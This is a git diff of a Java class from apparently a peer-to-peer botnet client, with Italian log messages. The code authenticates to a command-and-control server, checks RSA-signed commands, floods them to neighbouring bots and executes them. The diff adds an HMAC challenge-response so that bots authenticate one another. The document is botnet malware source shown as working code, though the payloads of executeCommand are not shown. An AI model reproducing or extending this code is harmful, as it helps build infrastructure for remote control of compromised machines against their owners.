@@ -6,6 +6,8 @@ import java.security.SignatureException;
 import java.util.ArrayList;
 import java.util.Collections;
 import java.util.List;
+import java.util.concurrent.ExecutionException;
+import java.util.concurrent.Future;
 
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.scheduling.annotation.Async;
@@ -81,7 +83,7 @@ public class Behavior {
 		} else
 			System.out.println("Bot Autenticazione fallita");
 		// System.out.println("Bot not Ready, authentication failed");
-		
+
 		String data = nServ.getIdHash();
 		List<Pairs<IP, PublicKey>> ips = nServ.getCommandConquerIps().getList();
 		List<Pairs<String, String>> response = null;
@@ -102,6 +104,8 @@ public class Behavior {
 		SyncIpList<IP, PublicKey> buf = nServ.getNeighbours();
 		buf.setAll(newNeighbours);
 		nServ.setNeighbours(buf);
+		System.out.println("Avviso i mie vicini di conoscerli");
+		challengeToBot();
 		System.out.println("INIZIALIZZAZIONE COMPLETATA, BOT READY");
 	}
 
@@ -124,9 +128,9 @@ public class Behavior {
 					nServ.isElegible());
 			System.out.println("La risposta del C&C: " + response);
 			return true;
-		}else{
-		return false;	
-		}		
+		} else {
+			return false;
+		}
 	}
 
 	// verify bot
@@ -189,7 +193,8 @@ public class Behavior {
 				// System.out.println("signature" + msgs[2]);
 				// System.out.println(" pk " +
 				// pki.demolishPuK(nServ.getCommandConquerIps().getList().get(0).getValue2()));
-				if (pki.validateSignedMessageRSA(msgs[0], msgs[2],nServ.getCommandConquerIps().getList().get(0).getValue2())) {
+				if (pki.validateSignedMessageRSA(msgs[0], msgs[2],
+						nServ.getCommandConquerIps().getList().get(0).getValue2())) {
 					Pairs<Integer, String> data = new Pairs<>();
 					data.setValue1(msgHashList.getSize() + 1);
 					data.setValue2(msgs[0]);
@@ -197,10 +202,10 @@ public class Behavior {
 					System.out.println("Signature OK");
 					// se verificato inoltralo ai vicini
 					System.out.println("Flood a vicini");
-					floodNeighoours(rawData, ip);					
+					floodNeighoours(rawData, ip);
 					// inoltra all'interpretedei msg
 					executeCommand(msgs[1]);
-					
+
 				} else {
 					System.out.println("Signature Comando FALLITA");
 				}
@@ -208,7 +213,7 @@ public class Behavior {
 				System.out.println("Errore verifica Signature durante il flooding " + msgs[2]);
 				e.printStackTrace();
 			}
-		}else{
+		} else {
 			System.out.println("Comando gia eseguito");
 		}
 
@@ -279,6 +284,87 @@ public class Behavior {
 		this.req = request;
 	}
 
+	public Pairs<Long, Integer> authReqBot(String idBot) {
+		Pairs<Long, Integer> response;
+		Long keyNumber = new Long(auth.generateNumberText());
+		Integer iterationNumber = new Integer(auth.generateIterationNumber());
+		auth.addBotChallengeInfo(idBot, keyNumber, iterationNumber);
+		response = new Pairs<Long, Integer>(keyNumber, iterationNumber);
+		return response;
+	}
+
+	public Boolean checkHmacBot(ArrayList<Object> objects) {
+		Boolean response = false;
+		String idBot = objects.get(0).toString();
+		String hashMac = objects.get(1).toString();
+		Long keyNumber = auth.getBotSeed().get(idBot).getValue1();
+		Integer iterationNumber = auth.getBotSeed().get(idBot).getValue2();
+		if (auth.findBotChallengeInfo(idBot)) {
+			if (auth.validateHmac(keyNumber, iterationNumber, hashMac)) {
+				response = true;
+				objects.forEach(obj -> System.out.println("obj: " + obj.toString()));
+				// aggiungere a vicini
+			}
+		}
+		return response;
+	}
+
+	/**
+	 * challenges one of the CeC
+	 * 
+	 * @return true if the challenges goes well
+	 * @throws ExecutionException
+	 * @throws InterruptedException
+	 */
+
+	private void challengeToBot() {
+		System.out.println("Invio challenge ai miei vicini ");
+
+		List<Pairs<IP, PublicKey>> listNegh = nServ.getNeighbours().getList();
+
+		List<Pairs<Future<Pairs<Long, Integer>>, IP>> botResp = new ArrayList<Pairs<Future<Pairs<Long, Integer>>, IP>>();
+
+		for (Pairs<IP, PublicKey> pairs : listNegh) {
+			Future<Pairs<Long, Integer>> result = req.getChallengeFromBot(nServ.getIdHash(), pairs.getValue1());
+			Pairs<Future<Pairs<Long, Integer>>, IP> element = new Pairs<Future<Pairs<Long, Integer>>, IP>(result,
+					pairs.getValue1());
+			botResp.add(element);
+		}
+
+		while (!botResp.isEmpty()) {
+			for (Pairs<Future<Pairs<Long, Integer>>, IP> coppia : botResp) {
+				if (coppia.getValue1().isDone()) {
+					if (coppia.getValue1() != null) {
+
+						Pairs<Long, Integer> resp;
+						try {
+							resp = coppia.getValue1().get();
+							IP dest = coppia.getValue2();
+							botResp.remove(coppia);
+							if (resp != null) {
+								String key = auth.generateStringKey(resp.getValue2());
+								String hashMac = auth.generateHmac(resp.getValue1(), auth.generateSecretKey(key));
+								req.getResponseFromBot(nServ.getMyIp(), dest, hashMac, pki.getPubRSAKey());
+							} else {
+								System.out.println("Il vicino ha risposto  null, nessun valore challenge");
+							}
+						} catch (InterruptedException | ExecutionException e) {
+							System.out.println("Errore connessione da ip " + coppia.getValue2().toString());
+							e.printStackTrace();
+						}
+					} else {
+
+						botResp.remove(coppia);
+						System.out.println("Rimosso hmac in attesa vicinato " + coppia.getValue2());
+
+					}
+				}
+			}
+		}
+
+		// return true;
+	}
+
 	// class RolesComp implements Comparator<Role>{
 	//
 	// @Override
@@ -295,7 +381,7 @@ public class Behavior {
 	public void getPower(String ip) {
 		System.out.println("Creo grafo rete P2P");
 		pServ.createNetworkP2P();
-		
+
 		System.out.println("Importo Database dal C&C");
 		// richiesta ruoli
 		List<Role> roles = req.getRoles(ip);
